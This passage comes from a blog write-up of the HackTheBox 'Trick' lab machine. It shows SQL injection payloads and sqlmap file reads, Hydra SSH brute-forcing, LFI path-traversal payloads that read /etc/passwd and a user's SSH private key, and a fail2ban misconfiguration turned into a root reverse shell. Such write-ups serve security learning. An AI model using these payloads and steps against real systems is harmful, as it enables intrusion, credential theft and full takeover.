 rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
 pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
 speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
 avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
 saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
 colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
 geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
 hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
 Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
 systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
 sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
 postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
 bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
 michael:x:1001:1001::/home/michael:/bin/bash
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">michael</code><li>This will take quite long because it is done by <code class="language-plaintext highlighter-rouge">time-based blind</code> SQLi</ul><li>There is another SQLi vulnerability at <code class="language-plaintext highlighter-rouge">Employees List</code> that is exploited by <code class="language-plaintext highlighter-rouge">boolean blind</code> SQLi, allowing us to read the file much quicker <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Trick/images/Pasted%20image%2020220727050128.png" alt="" data-proofer-ignore><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre> Parameter: id (POST)
     Type: boolean-based blind
     Title: Boolean-based blind - Parameter replace (original value)
     Payload: id=(SELECT (CASE WHEN (8486=8486) THEN '' ELSE (SELECT 9870 UNION SELECT 4043) END))&amp;firstname=test&amp;middlename=test&amp;lastname=test&amp;department_id=3&amp;position_id=4&amp;salary=123
	
	
 [*] starting @ 05:09:56 /2022-07-27/
	
 [*] ending @ 05:20:52 /2022-07-27/
</pre></table></code></div></div><li>Bruteforce SSH<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre>┌──(root💀kali)-[~/htb/trick/10.10.11.166]
└─# cat usernames.txt 
root
mysql
Enemigosss
remo
michael┌──(root💀kali)-[~/htb/trick/10.10.11.166]
└─# cat passwords.txt 
SuperGucciRainbowCake
TrulyImpossiblePasswordLmao123
	
┌──(root💀kali)-[~/htb/trick/10.10.11.166]
└─# hydra -L usernames.txt -P passwords.txt ssh://10.10.11.166 -V
Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
	
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-27 05:06:47
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:5/p:2), ~1 try per task
[DATA] attacking ssh://10.10.11.166:22/
[ATTEMPT] target 10.10.11.166 - login "root" - pass "SuperGucciRainbowCake" - 1 of 10 [child 0] (0/0)
[ATTEMPT] target 10.10.11.166 - login "root" - pass "TrulyImpossiblePasswordLmao123" - 2 of 10 [child 1] (0/0)
[ATTEMPT] target 10.10.11.166 - login "mysql" - pass "SuperGucciRainbowCake" - 3 of 10 [child 2] (0/0)
[ATTEMPT] target 10.10.11.166 - login "mysql" - pass "TrulyImpossiblePasswordLmao123" - 4 of 10 [child 3] (0/0)
[ATTEMPT] target 10.10.11.166 - login "Enemigosss" - pass "SuperGucciRainbowCake" - 5 of 10 [child 4] (0/0)
[ATTEMPT] target 10.10.11.166 - login "Enemigosss" - pass "TrulyImpossiblePasswordLmao123" - 6 of 10 [child 5] (0/0)
[ATTEMPT] target 10.10.11.166 - login "remo" - pass "SuperGucciRainbowCake" - 7 of 10 [child 6] (0/0)
[ATTEMPT] target 10.10.11.166 - login "remo" - pass "TrulyImpossiblePasswordLmao123" - 8 of 10 [child 7] (0/0)
[ATTEMPT] target 10.10.11.166 - login "michael" - pass "SuperGucciRainbowCake" - 9 of 10 [child 8] (0/0)
[ATTEMPT] target 10.10.11.166 - login "michael" - pass "TrulyImpossiblePasswordLmao123" - 10 of 10 [child 9] (0/0)
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-27 05:06:52
	
</pre></table></code></div></div><ul><li>Failed</ul><li>Read up on Nginx<ul><li><a href="https://www.keycdn.com/support/nginx-virtual-host#:~:text=A%20virtual%20host%20is%20an,websites%20on%20a%20single%20server.">Server Blocks</a><ul><li>Able to host multiple websites on a single server<li>A <code class="language-plaintext highlighter-rouge">server</code> block consists of a subset of configurations that define a virtual server<li>Multiple server blocks are possible to decide which block will handle the request based on domain name, IP address and port.</ul><li><a href="https://www.youtube.com/watch?v=3q2xxMc7XEo">Location Blocks</a><ul><li>Located within server blocks, that determines how request are processed for different URIs and resources<li>https://www.keycdn.com/support/nginx-location-directive</ul><li>What is <code class="language-plaintext highlighter-rouge">/etc/nginx/sites-available/*</code> directory<ul><li>It is a place to store configuration files for your website(s)<li>If you wish to enable that website, create a symlink to <code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/&lt;website name&gt;</code>, only then it is enabled<li>It is best practice to create a new file for each website/vhost to manage them easier<li>It is best practice to name the file after the website’s FQDN<li><a href="https://stackoverflow.com/questions/71260124/nginx-configuration-files-in-different-locations">Source</a></ul><li>What is <code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/*</code> directory<ul><li>It contains the configuration details of currently running website, such as<ul><li>Root directory, <code class="language-plaintext highlighter-rouge">/var/www/html</code><li>Server Name, <code class="language-plaintext highlighter-rouge">trick.htb, preprod-payroll</code><li>Directories <code class="language-plaintext highlighter-rouge">/assets, /database</code></ul></ul></ul><li>Read <code class="language-plaintext highlighter-rouge">nginx</code> configuration file to find out more details on the webserver<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>┌──(root💀kali)-[~/htb/trick/10.10.11.166/exploit]
└─# sqlmap -r sqli.txt --output-dir=$(pwd)/sqlmap  --file-read=/etc/nginx/nginx.conf --batch --threads 10
	
[22:35:45] [INFO] retrieving the length of query output
[22:35:45] [INFO] retrieved: 4
[22:35:45] [INFO] retrieved: 1482           
[22:35:45] [INFO] the local file '/root/htb/trick/10.10.11.166/exploit/sqlmap/preprod-payroll.trick.htb/files/_etc_nginx_nginx.conf' and the remote file '/etc/nginx/nginx.conf' have the same size (1482 B)
files saved to [1]:
[*] /root/htb/trick/10.10.11.166/exploit/sqlmap/preprod-payroll.trick.htb/files/_etc_nginx_nginx.conf (same file)
	
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Trick/images/Pasted%20image%2020220730231348.png" alt="" data-proofer-ignore></p><ul><li><code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/*</code><ul><li>Files in <code class="language-plaintext highlighter-rouge">sites-enabled</code> could reveal<ul><li>web directories that we have not discovered yet<li>Could reveal names of other website</ul><li>We have to guess the filename, it is usually named after website’s FQDN or<li><code class="language-plaintext highlighter-rouge">default</code> if the web administrator did not bother to rename it / seperate the configuration based on different vhost/website</ul></ul><li>Check if <code class="language-plaintext highlighter-rouge">/etc/nginx/sites-available/default</code> or <code class="language-plaintext highlighter-rouge">/etc/nginx/sites-available/default</code> exists by attempting to read it<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>┌──(root💀kali)-[~/htb/trick/10.10.11.166/exploit]
└─# sqlmap -r sqli.txt --output-dir=$(pwd)/sqlmap  --file-read=/etc/nginx/sites-enabled/default --batch --threads 10
	
[23:24:01] [INFO] retrieving the length of query output
[23:24:01] [INFO] retrieved: 4
[23:24:02] [INFO] retrieved: 1058           
[23:24:02] [INFO] the local file '/root/htb/trick/10.10.11.166/exploit/sqlmap/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default' and the remote file '/etc/nginx/sites-enabled/default' have the same size (1058 B)
files saved to [1]:
[*] /root/htb/trick/10.10.11.166/exploit/sqlmap/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default (same file)
	
[23:24:02] [INFO] fetched data logged to text files under '/root/htb/trick/10.10.11.166/exploit/sqlmap/preprod-payroll.trick.htb'
	
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Trick/images/Pasted%20image%2020220731001645.png" alt="" data-proofer-ignore></p><ul><li>Add <code class="language-plaintext highlighter-rouge">preprod-marketing.trick.htb</code> to <code class="language-plaintext highlighter-rouge">/etc/hosts</code></ul></ol><h2 id="lfi-vulnerability---2">LFI Vulnerability - 2 <a href="#lfi-vulnerability---2" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Proceed to <code class="language-plaintext highlighter-rouge">preprod-marketing.trick.htb</code><li>After browsing through the pages, found <code class="language-plaintext highlighter-rouge">GET</code> parameter that could be susceptible to local file inclusion <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Trick/images/Pasted%20image%2020220731014849.png" alt="" data-proofer-ignore><li>FUZZ file to include<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/trick/10.10.11.166/exploit]
 └─# ffuf -u http://preprod-marketing.trick.htb/index.php?page=FUZZ -w /usr/share/wordlists/LFI/file_inclusion_linux.txt  -fw 1
	
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
          \ \_\   \ \_\  \ \____/  \ \_\       
           \/_/    \/_/   \/___/    \/_/       
	
        v1.3.1 Kali Exclusive &lt;3
 ________________________________________________
	
  :: Method           : GET
  :: URL              : http://preprod-marketing.trick.htb/index.php?page=FUZZ
  :: Wordlist         : FUZZ: /usr/share/wordlists/LFI/file_inclusion_linux.txt
  :: Follow redirects : false
  :: Calibration      : false
  :: Timeout          : 10
  :: Threads          : 40
  :: Matcher          : Response status: 200,204,301,302,307,401,403,405
  :: Filter           : Response words: 1
 ________________________________________________
	
 ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42]
 ....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42]
 ....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42]
 ....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42]
 ....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42]
 ....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42]
 ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42]
 ....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42]
 ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42]
 ....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42]
 ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42]
 ....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42]
 ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42]
 ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42]
 ....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42]
 ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42]
 ....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42]
 ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42]
 ....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42]
 ....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42]
 :: Progress: [2249/2249] :: Job [1/1] :: 797 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
	
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">....//....//....//</code><ul><li>There is some sort of input sanitization, <code class="language-plaintext highlighter-rouge">//</code> &amp; <code class="language-plaintext highlighter-rouge">....</code> two slashes and 4 dots are needed, instead of the usual <code class="language-plaintext highlighter-rouge">../</code></ul></ul><li>Earlier, we found out that there is a user called <code class="language-plaintext highlighter-rouge">michael</code>, attempt to include his <code class="language-plaintext highlighter-rouge">id_rsa</code> private key<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/trick/10.10.11.166/exploit]
 └─# curl http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//home/michael/.ssh/id_rsa &gt; id_rsa;chmod 600 id_rsa
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100  1823    0  1823    0     0  24376      0 --:--:-- --:--:-- --:--:-- 24635
	
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Trick/images/Pasted%20image%2020220731022232.png" alt="" data-proofer-ignore></p></ol><h2 id="tcp22---ssh">TCP/22 - SSH <a href="#tcp22---ssh" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>SSH w/ michael’s private key<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/trick/10.10.11.166/exploit]
 └─# ssh michael@trick.htb -i id_rsa 
 Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64
	
 The programs included with the Debian GNU/Linux system are free software;
 the exact distribution terms for each program are described in the
 individual files in /usr/share/doc/*/copyright.
	
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 Last login: Sat Jul 30 20:19:33 2022 from 10.10.14.2
 michael@trick:~$ 
	
</pre></table></code></div></div></ol><h1 id="privilege-escalation">Privilege Escalation</h1><h2 id="root---via-fail2ban-misconfiguration">Root - Via Fail2Ban Misconfiguration <a href="#root---via-fail2ban-misconfiguration" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Ran <code class="language-plaintext highlighter-rouge">linpeas</code>, found something interesting <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Trick/images/Pasted%20image%2020220731052029.png" alt="" data-proofer-ignore><ul><li>We have write access to <code class="language-plaintext highlighter-rouge">action.d</code> folder because <code class="language-plaintext highlighter-rouge">security</code> group has write access<li><code class="language-plaintext highlighter-rouge">michael</code> belongs to the <code class="language-plaintext highlighter-rouge">security</code> group</ul><li>Ran <code class="language-plaintext highlighter-rouge">pspy64</code> to sniff processes <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Trick/images/Pasted%20image%2020220731051840.png" alt="" data-proofer-ignore><ul><li>There is a cronjob running every 3 minutes that deletes configuration files from <code class="language-plaintext highlighter-rouge">/etc/fail2ban</code></ul><li>Google <code class="language-plaintext highlighter-rouge">fail2ban</code> privilege escalation guide<ul><li><a href="https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7">Guide I followed</a><li><a href="https://linuxize.com/post/install-configure-fail2ban-on-debian-10/">What is fail2ban</a><li>How it fail2ban is supposed to work<ul><li>For e.g., sshd is enabled in the jail configuration file (<code class="language-plaintext highlighter-rouge">jail.conf, jail.d/*.conf</code>, if someone were to bruteforce SSH logins, the ban action will be triggered (timeout)</ul><li>Exploiting it<ul><li>The ban action configuration (determines what happens if ban is triggered) is located at <code class="language-plaintext highlighter-rouge">/etc/fail2ban/action.d/ip-tables/multiport.conf</code> where we have write access.<li>Replace the ban action to a reverse shell/ to create <code class="language-plaintext highlighter-rouge">/bin/bash</code> with SUID bit set<li>Then trigger the ban to obtain our root shell</ul></ul><li>In this machine, there is a cronjob that replaces fail2ban configuration every 3 minutes, this means that we have to complete our exploit within 3 minutes otherwise the file (<code class="language-plaintext highlighter-rouge">multiport.conf</code>) will be replaced<li>Check if <code class="language-plaintext highlighter-rouge">sshd</code> ban is enabled <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Trick/images/Pasted%20image%2020220731053114.png" alt="" data-proofer-ignore><ul><li><code class="language-plaintext highlighter-rouge">enabled</code></ul><li>Create a copy of <code class="language-plaintext highlighter-rouge">/etc/fail2ban/action.d/ip-tables/multiport.conf</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> michael@trick:/etc/fail2ban/jail.d$ cp /etc/fail2ban/action.d/ip-tables/multiport.conf /tmp/multiport.conf
</pre></table></code></div></div><li>Add our reverse shell to <code class="language-plaintext highlighter-rouge">/tmp/multiport.conf</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Trick/images/Pasted%20image%2020220731054343.png" alt="" data-proofer-ignore><li>Start listener on Kali<li>Create script to replace our malicious file with the actual file<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre> michael@trick:/tmp$ cat script.sh 
 rm /etc/fail2ban/action.d/iptables-multiport.conf
 cp /tmp/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf
 michael@trick:/tmp$ ./script.sh 
 rm: remove write-protected regular file '/etc/fail2ban/action.d/iptables-multiport.conf'? yes
 michael@trick:/tmp$ 
	
</pre></table></code></div></div><li>Restart <code class="language-plaintext highlighter-rouge">fail2ban</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>michael@trick:/tmp$ sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
	
</pre></table></code></div></div><li>Bruteforce SSH<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(root💀kali)-[~/htb/trick/10.10.11.166]
└─# hydra -e nsr -P /usr/share/wordlists/rockyou.txt ssh://10.10.11.166 -VI
</pre></table></code></div></div><li>Root obtained <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Trick/images/Pasted%20image%2020220731054941.png" alt="" data-proofer-ignore><li>Proceed to root, copy its <code class="language-plaintext highlighter-rouge">id_rsa</code> &amp; SSH into root</ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/hackthebox-linux/'>HackTheBox - Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tcp-53-dns/" class="post-tag no-text-decoration" >tcp/53-dns</a> <a href="/tags/exploit-file-inclusion-lfi/" class="post-tag no-text-decoration" >exploit/file-inclusion/lfi</a> <a href="/tags/exploit-sqli-auth-bypass/" class="post-tag no-text-decoration" >exploit/sqli/auth-bypass</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - Trick - Yufong&amp;u=https://yufongg.github.io/posts/Trick/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label=""> <i class="fa-fw "></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Blunder/">HackTheBox - Blunder</a><li><a href="/posts/Attacktive-Directory/">TryHackMe - Attacktive Directory</a><li><a href="/posts/Tommy-Boy-1/">Vulnhub - Tommy Boy 1</a><li><a href="/posts/Tiki-1/">Vulnhub - Tiki 1</a><li><a href="/posts/Breach-1/">Vulnhub - Breach 1</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Cronos/"><div class="card-body"> <em class="timeago small" data-ts="1661184000" > 2022-08-23 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Cronos</h3><div class="text-muted small"><p> Overview This machine begins w/ a DNS enumeration, revealing several subdomains. After enumerating the subdomains, admin.cronos.htb is susceptible to SQLi authentication bypass and a command injec...</p></div></div></a></div><div class="card"> <a href="/posts/UpDown/"><div class="card-body"> <em class="timeago small" data-ts="1674403200" > 2023-01-23 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - UpDown</h3><div class="text-muted small"><p> Overview This machine begins w/ a web enumeration, /dev/.git is discovered, since .git is found, we are able to view the logs and commits of the git repository, providing us w/ the header needed to...</p></div></div></a></div><div class="card"> <a href="/posts/Paper/"><div class="card-body"> <em class="timeago small" data-ts="1655395200" > 2022-06-17 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Paper</h3><div class="text-muted small"><p> Overview This machine begins w/ a wordpress 5.2.3 exploit, allowing us to view private post w/o being authenticated, revealing a subdomain chat.office.paper. A chatbot is running on chat.office.pa...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/OpenSource/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox - OpenSource</p></a> <a href="/posts/Shared/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox - Shared</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://yufongg.github.io/posts/Trick/'; this.page.identifier = '/posts/Trick/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://yufongg-github-io.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/yufongg">yufongg</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 